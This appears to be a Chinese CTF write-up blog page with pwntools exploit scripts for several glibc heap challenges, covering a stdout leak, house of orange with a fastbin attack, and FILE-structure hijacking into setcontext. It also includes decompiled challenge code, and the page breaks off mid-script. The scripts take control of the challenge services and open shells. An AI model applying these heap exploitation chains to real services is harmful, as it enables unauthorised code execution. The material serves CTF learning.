<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3ebc40</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.182.233'</span>,<span class="number">41251</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Realloc</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size &gt; <span class="number">0</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Content?"</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(chunk_type)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Magic</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'666'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Realloc(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#Delete('r')</span></span><br><span class="line">    Realloc(<span class="number">0xf0</span>,<span class="string">'b'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#Delete('r')</span></span><br><span class="line">    Realloc(<span class="number">0x110</span>,<span class="string">'c'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#Delete('r')</span></span><br><span class="line">    Realloc(<span class="number">0xf0</span>,<span class="string">'d'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Delete(<span class="string">'r'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Realloc(<span class="number">0x100</span>,<span class="string">'e'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        Realloc(<span class="number">0x200</span>,<span class="string">'e'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+<span class="string">"\x60\xa7"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#Realloc(0x200,'e'*0x100+p64(0)+p64(0x41)+"\x60\x07\xdd")</span></span><br><span class="line">        Realloc(<span class="number">0x200</span>,<span class="string">'e'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+<span class="string">"\x60\xa7"</span>)</span><br><span class="line"></span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    Realloc(<span class="number">0xf0</span>,<span class="string">'f'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Realloc(<span class="number">0xf0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    p.recvn(<span class="number">0x21</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dcf780</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Magic()</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Realloc(<span class="number">0x100</span>+<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#Delete('r')</span></span><br><span class="line">    Realloc(<span class="number">0xf0</span>+<span class="number">0x30</span>,<span class="string">'b'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#Delete('r')</span></span><br><span class="line">    Realloc(<span class="number">0x110</span>+<span class="number">0x30</span>,<span class="string">'c'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#Delete('r')</span></span><br><span class="line">    Realloc(<span class="number">0xf0</span>+<span class="number">0x30</span>,<span class="string">'d'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Delete(<span class="string">'r'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Realloc(<span class="number">0x100</span>+<span class="number">0x30</span>,<span class="string">'e'</span>)</span><br><span class="line">    Realloc(<span class="number">0x200</span>+<span class="number">0x30</span>+<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x130</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(free_hook))</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    Realloc(<span class="number">0x120</span>,<span class="string">'a'</span>)</span><br><span class="line">    Realloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">    one_gadget = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    Realloc(<span class="number">0x120</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Realloc(0x140,"/bin/sh\x00")</span></span><br><span class="line">    Delete(<span class="string">'r'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'39.97.182.233'</span>,<span class="number">41251</span>)</span><br></pre></td></tr></table></figure>
<h2 id="巅峰极客挑战赛"><a href="#巅峰极客挑战赛" class="headerlink" title="巅峰极客挑战赛"></a>巅峰极客挑战赛</h2><h3 id="snoet"><a href="#snoet" class="headerlink" title="snoet"></a>snoet</h3><p>house of orange拿到ub，泄露Libc，fastbin attack拿到shell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'55fca716.gamectf.com'</span>,<span class="number">37009</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size &gt; "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content &gt; \n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size &gt; "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content &gt; \n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">"What's your name?\n"</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'wz'</span>)</span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0000555555554f59')</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x50</span>,<span class="string">'0'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfb1</span>))</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x1000</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    Show()</span><br><span class="line">    p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">88</span> - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x620</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    fake_chunk = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Delete()</span><br><span class="line">    Edit(<span class="number">8</span>,p64(fake_chunk))</span><br><span class="line">    Add(<span class="number">0x60</span>,p64(fake_chunk))</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size &gt; "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">17</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>这道题是最近做过的最有价值的几道之一了，其中预期解的解法还没有复现，暂时先记下来。</p>
<h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>可以Add 0x10个块，限制Add的chunk地址范围在[heap_base,heap_base+0x600]之间,chunk_list是map出来的随机地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 map_addr; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 *node; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rax</span></span><br><span class="line">  __int64 size1; <span class="comment">// rbp</span></span><br><span class="line">  _BYTE *chunk_addr; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  map_addr = qword_2020B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your index:"</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> || (node = (<span class="keyword">unsigned</span> __int64 *)(<span class="number">16</span> * idx + map_addr), node[<span class="number">1</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of range or note already exist"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your size:"</span>);</span><br><span class="line">  size = read_int();</span><br><span class="line">  size1 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x7F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *node = size;</span><br><span class="line">  chunk_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)chunk_addr &lt; qword_2020B0 || (<span class="keyword">unsigned</span> __int64)chunk_addr &gt; qword_2020B0 + <span class="number">0x600</span> )</span><br><span class="line">  &#123;                                             <span class="comment">// limit to 0,0x600</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are bad"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  node[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int64)chunk_addr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your context:"</span>);</span><br><span class="line">  get_input(chunk_addr, size1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"add note success!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Delete里有UAF</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 map_addr; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  map_addr = qword_2020B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your index:"</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> || (chunk_addr = *(<span class="keyword">void</span> **)(map_addr + <span class="number">16</span> * idx + <span class="number">8</span>)) == <span class="number">0L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of range or note not exist"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(chunk_addr);                             <span class="comment">// UAF</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"note delete success!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有输出函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = qword_2020B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your index:"</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> || !*(_QWORD *)(v0 + <span class="number">16</span> * idx + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of range or note not exist"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _printf_chk(<span class="number">1L</span>L, <span class="string">"note[%lu]: %s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可惜Edit是读取的随机字符</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 map_addr; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> *size_addr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  map_addr = qword_2020B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your index:"</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> || (size_addr = (<span class="keyword">size_t</span> *)(map_addr + <span class="number">16</span> * idx), (chunk_addr = (<span class="keyword">void</span> *)size_addr[<span class="number">1</span>]) == <span class="number">0L</span>L) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of range or note not exist"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fread(chunk_addr, <span class="number">1u</span>LL, *size_addr, stream);  <span class="comment">// read random</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>程序有沙箱，不能Get shell，第一种解法是学习n132师傅的做法，先泄露libc和heap，注意随机数的stream放在heap_base里，我们分配到这个地方，即可修改一个FILE结构体，把它的_chain修改到我们伪造的文件结构体，最终使得在exit或者return的时候调用到set_context+53，这个东西是这样的，只要控制rdi存的地址和之后[rdi+0xa8]的内容即可，注意[rdi+0xa8]（被弹到rcx的那个地址）对应的是rip，也就是我们执行完setcontext后执行的地址，而rsp是我们执行完rip之后要执行的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7ffff7a7a565 &lt;setcontext+53&gt;:      mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">0x7ffff7a7a56c &lt;setcontext+60&gt;:      mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">0x7ffff7a7a573 &lt;setcontext+67&gt;:      mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">0x7ffff7a7a577 &lt;setcontext+71&gt;:      mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">0x7ffff7a7a57b &lt;setcontext+75&gt;:      mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">0x7ffff7a7a57f &lt;setcontext+79&gt;:      mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">0x7ffff7a7a583 &lt;setcontext+83&gt;:      mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">0x7ffff7a7a587 &lt;setcontext+87&gt;:      mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">0x7ffff7a7a58e &lt;setcontext+94&gt;:      push   rcx</span><br><span class="line">0x7ffff7a7a58f &lt;setcontext+95&gt;:      mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">0x7ffff7a7a593 &lt;setcontext+99&gt;:      mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">0x7ffff7a7a59a &lt;setcontext+106&gt;:     mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">0x7ffff7a7a5a1 &lt;setcontext+113&gt;:     mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">0x7ffff7a7a5a5 &lt;setcontext+117&gt;:     mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">0x7ffff7a7a5a9 &lt;setcontext+121&gt;:     mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">0x7ffff7a7a5ad &lt;setcontext+125&gt;:     xor    eax,eax</span><br><span class="line">0x7ffff7a7a5af &lt;setcontext+127&gt;:     ret</span><br></pre></td></tr></table></figure>
<p>另一种解法（预期解）前面是相似的，分配到随机的那个file里，之后出题人选择把fileno改成0，这样就可以从stdin里edit了，之后参考另一个大佬的博客(<a href="https://q1iq.github.io/2019/10/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ichunqiu-wp/" target="_blank" rel="noopener">https://q1iq.github.io/2019/10/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ichunqiu-wp/</a>)</p>
<blockquote>
<p>1.泄露libc和heap base  </p>
<ol start="2">
<li>构造overlap改top的size，利用house_of_force在堆基地址分配块，改stream的内容  </li>
<li>改stream的fileno为0即stdin，可以正常输入，这样就可以修正top chunk的size，否则后面的malloc函数和free函数都不能使用。  </li>
<li>改stream的vtable-&gt;__xsgetn为fopen，恰当构造“./flag”和“r”字符串，可以在change的时候fopen(“./flag”,”r”)。</li>
<li>将stream的vtable的内容改回正常的值（只需将vtable-&gt;<strong>xsgetn 和 vtable-&gt;</strong>read改为正常值即可）</li>
<li>change随便一个块，因为此时stream的fileno为fopen(“./flag”,”r”)得到的文件描述符，所以flag的值会被写入该块，随后show该块即可得到flag</li>
</ol>
</blockquote>
<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><p>自己没有实践第二种方法，贴一下第一种解法<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn3'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'a139cb3d.gamectf.com'</span>,<span class="number">15189</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input your index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"input your size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"input your context:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input your index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input your index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input your index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0x88</span>,p64(<span class="number">0x21</span>)*<span class="number">0x10</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"note[0]: "</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - (libc.sym[<span class="string">'__malloc_hook'</span>]+<span class="number">0x10</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">4</span>,<span class="number">0x228</span>,p64(<span class="number">0x221</span>)*<span class="number">40</span>+<span class="string">'\n'</span>)<span class="comment">#4</span></span><br><span class="line">    Show(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"note[2]: "</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x230</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#small bins FIFO</span></span><br><span class="line">    Add(<span class="number">5</span>,<span class="number">0x88</span>,<span class="string">'\n'</span>)<span class="comment">#ini 0</span></span><br><span class="line">    Add(<span class="number">6</span>,<span class="number">0x88</span>,<span class="string">'\n'</span>)<span class="comment">#ini 